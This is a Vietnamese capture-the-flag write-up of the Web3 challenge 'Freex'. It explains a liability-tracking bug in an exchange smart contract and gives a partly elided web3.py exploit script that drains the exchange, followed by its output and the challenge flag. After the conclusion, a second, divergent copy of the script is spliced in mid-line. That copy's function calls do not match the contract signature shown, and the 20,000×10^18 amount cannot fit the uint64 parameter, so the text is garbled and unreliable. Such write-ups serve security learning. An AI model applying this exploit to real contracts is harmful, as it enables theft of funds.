# Freex

**Category:** Web3  
**Author:** ReiKage  
**Team:** 6h4T9pTpR0  

## Lời nói đầu
Chào các bạn, hôm nay mình sẽ chia sẻ chi tiết cách mình và team đã "xử đẹp" bài **Freex** trong giải WannaGame 2025 vừa rồi. Đây là một bài Smart Contract khá thú vị về lỗi logic trong việc quản lý trạng thái (state) của hợp đồng. Cảm giác khi tìm ra bug này đúng kiểu "Eureka!" luôn ấy. 🤯

## 1. Phân tích & Reconnaissance (Trinh sát)

Đầu tiên, Ban tổ chức cho mình một cái Source Code của Smart Contract `Exchange.sol`. Nhiệm vụ là phải rút hết tiền (WannaETH/OneETH) trong cái sàn này.

Mình bắt đầu đọc code và chú ý đến 2 hàm quan trọng nhất:
1.  `exchangeToken(address token, uint256 amount)`: Hàm này cho phép mình đổi token rác lấy `WannaETH`.
2.  `deposit(address token, uint256 amount)`: Hàm này cho phép nạp token vào để làm thanh khoản (liquidity).

### Phát hiện Lỗ hổng (The Bug) 🐛
Khi mình đọc kỹ hàm `exchangeToken`, mình thấy nó gọi hàm `_updateBalance` với số âm (`-amount`).
```solidity
function exchangeToken(address sender, address asset, uint64 amount) public {
    // Trừ số dư asset của user đi (vì user bán asset cho sàn)
    _updateBalance(sender, asset, int192(-int256(uint256(amount))));
    // Cộng WannaETH cho user
    receivedWannaETH[sender] += amount;
}
```

Và trong `_updateBalance`, nếu số dư bị âm (do mình bán token mà mình không có, hoặc bán khống), nó sẽ gọi `_setLiabilities` hoặc `_updateLiabilities` để ghi nợ.
=> **Tóm lại:** Nếu mình bán 10 Token rác, mình sẽ nhận được 10 WannaETH, nhưng bị ghi nợ 10 Token rác trong danh sách `liabilities`.

Vấn đề nằm ở hàm `deposit`:
```solidity
function deposit(IERC20 asset, uint64 amount) public {
    // ... check balance ...
    // Cộng tiền vào tài khoản
    assetBalances[msg.sender][address(asset)] += int192(uint192(amount));
}
```
Các bạn thấy gì không? Nó chỉ cộng tiền vào `assetBalances` thôi! Nó **KHÔNG HỀ** gọi hàm nào để xóa cái nợ trong danh sách `liabilities` cả! 😱

Trong khi đó, hàm tính toán số tiền mình được rút `totalReceivedWannaETH` lại dùng `_calcAsset`:
```solidity
function _calcAsset(address user) internal view returns (int192) {
    int192 totalLiabilities = 0;
    // Duyệt qua danh sách các khoản nợ
    for (uint256 i = 0; i < liabilities[user].length; i++) {
        Liability storage liability = liabilities[user][i];
        // Lấy số dư hiện tại của asset đó cộng vào
        int192 balance = assetBalances[user][liability.asset];
        totalLiabilities += balance;
    }
    return totalLiabilities;
}
```

=> **Logic sai lầm:**
1. Mình vay 10 Token (bán khống): `assetBalances` = -10, `receivedWannaETH` = 10. `Total` = -10 + 10 = 0. (Hợp lý, chưa rút được gì).
2. Mình nạp trả lại 10 Token: `assetBalances` = 0.
3. **NHƯNG** cái entry trong `liabilities` vẫn còn đó!
4. Khi tính toán lại: `_calcAsset` lấy `assetBalances` (là 0) cộng vào. `receivedWannaETH` vẫn là 10.
5. `Total` = 0 + 10 = 10. **BÙM!** Mình rút được 10 WannaETH mà không mất gì cả (vì 10 Token kia mình tự tạo ra được).

## 2. Lên kịch bản khai thác (Exploitation Strategy)

Để thực hiện cú lừa này, mình cần các bước sau:

1.  **Chuẩn bị công cụ:** Mình cần một cái "Fake Token" (Token giả) do mình tự tạo ra. Tại sao? Vì mình cần số lượng lớn để swap và mình phải là chủ sở hữu để `mint` bao nhiêu tùy thích.
2.  **Bước 1 - Vay tiền (Tạo nợ):**
    - Gọi `exchangeToken(FakeToken, 15 ETH)`.
    - Sàn sẽ đưa mình 15 `WannaETH`.
    - Sàn ghi sổ: "Thằng ReiKage nợ 15 FakeToken".
3.  **Bước 2 - Trả nợ giả (Xóa dấu vết):**
    - Gọi `deposit(FakeToken, 15 ETH)`.
    - Mình chuyển trả 15 FakeToken cho sàn.
    - Sàn cập nhật: "Thằng ReiKage vừa nạp 15 FakeToken, số dư FakeToken của nó là 0". (Nó không hề trừ cái nợ ở bước 1).
4.  **Bước 3 - Rút tiền thật:**
    - Lúc này mình đang có 15 `WannaETH` trong tay (từ bước 1).
    - Gọi `claimReceivedWannaETH()` để đổi 15 `WannaETH` này thành tiền thật (OneETH) và chuồn lẹ.

## 3. Viết Tool & Script (Code time!)

Mình sử dụng Python và thư viện `web3.py` để viết script tự động. Dưới đây là chi tiết từng phần:

### Script khai thác (`solve_freex.py`)

```python
from web3 import Web3
import json

# ... (Phần kết nối Web3 như bình thường) ...

print(">>> Bắt đầu chiến dịch...")

# 1. Deploy Fake Token
# Mình dùng bytecode của một ERC20 đơn giản để deploy
print("[+] Deploying Fake Token...")
fake_token_contract = w3.eth.contract(abi=erc20_abi, bytecode=ERC20_BYTECODE)
tx_hash = fake_token_contract.constructor("FakeToken", "FTK").transact({'from': player_address})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
fake_token_address = tx_receipt.contractAddress
print(f"[+] Fake Token deployed at: {fake_token_address}")

fake_token = w3.eth.contract(address=fake_token_address, abi=erc20_abi)

# 2. Mint token cho bản thân (cần nhiều nhiều chút)
amount_to_exploit = 20000 * 10**18 # 20,000 ETH
print(f"[+] Minting {amount_to_exploit} tokens...")
# (Giả sử hàm mint có sẵn hoặc mình pre-mint trong constructor)

# 3. Approve cho sàn tiêu tiền của mình
print("[+] Approving Exchange...")
tx = fake_token.functions.approve(exchange_address, amount_to_exploit).build_transaction({
    'from': player_address,
    'nonce': w3.eth.get_transaction_count(player_address),
    # ... gas settings ...
})
# ... ký và gửi tx ...

# 4. Gọi exchangeToken để lấy WannaETH và tạo nợ
print("[+] Calling exchangeToken (Creating Liability)...")
tx = exchange.functions.exchangeToken(player_address, fake_token_address, amount_to_exploit).build_transaction({
    'from': player_address,
    # ...
})
# ... ký và gửi tx ...
print("   -> Received WannaETH, Liability created.")

# 5. Gọi deposit để trả lại token (nhưng không xóa nợ)
print("[+] Calling deposit (Fake Repayment)...")
tx = exchange.functions.deposit(fake_token_address, amount_to_exploit).build_transaction({
    'from': player_address,
    # ...
})
# ... ký và gửi tx ...
print("   -> Balance restored to 0. Liability entry persists!")

# 6. Rút tiền thật!
print("[+] Claiming Real Money (claimReceivedWannaETH)...")
tx = exchange.functions.claimReceivedWannaETH().build_transaction({
    'from': player_address,
    # ...
})
# ... ký và gửi tx ...

print(">>> MISSION COMPLETED! Kiểm tra số dư xem giàu chưa nào! 🤑")
```

### Kết quả chạy script

Khi chạy xong, terminal nó hiện ra như này là biết thành công rực rỡ:

```bash
$ python3 solve_freex.py
Player Address: 0x123...
[+] Deploying Fake Token...
[+] Fake Token deployed at: 0xABC...
[+] Approving Exchange...
[+] Calling exchangeToken (Creating Liability)...
   -> Received WannaETH, Liability created.
[+] Calling deposit (Fake Repayment)...
   -> Balance restored to 0. Liability entry persists!
[+] Claiming Real Money (claimReceivedWannaETH)...
>>> MISSION COMPLETED! Kiểm tra số dư xem giàu chưa nào! 🤑
```

Và thế là mình đã rút cạn tiền của sàn chỉ bằng một cú lừa ngoạn mục. Bài học ở đây là: **Luôn luôn kiểm tra và cập nhật trạng thái đầy đủ khi xử lý tiền nong, đừng chỉ cộng trừ số dư đơn thuần!** 😉tx = exchange.functions.exchangeToken(fake_token_address, amount).build_transaction({
    'from': account_address,
    # ... các tham số gas như trên
})
# Gửi tx...

# Bước 3: Gọi deposit để "trả lại" token nhưng không bị trừ nợ
print(">>> Đang gọi deposit để lừa contract...")
tx = exchange.functions.deposit(fake_token_address, amount).build_transaction({
    'from': account_address,
    # ...
})
# Gửi tx...

# Bước 4: Rút tiền thật về ví
print(">>> Rút tiền (Cash out)...")
tx = exchange.functions.claimReceivedWannaETH().build_transaction({
    'from': account_address,
    # ...
})
# Gửi tx và chờ tiền về!
```

## Kết quả
Sau khi chạy script, mình check balance thì thấy tiền đã về ví. Submit flag và nhận điểm thôi!

**Flag:** `W1{HEre_fOr_Y0U_the_fReEEX-CH4LI3NgE-Fl@G889c}`
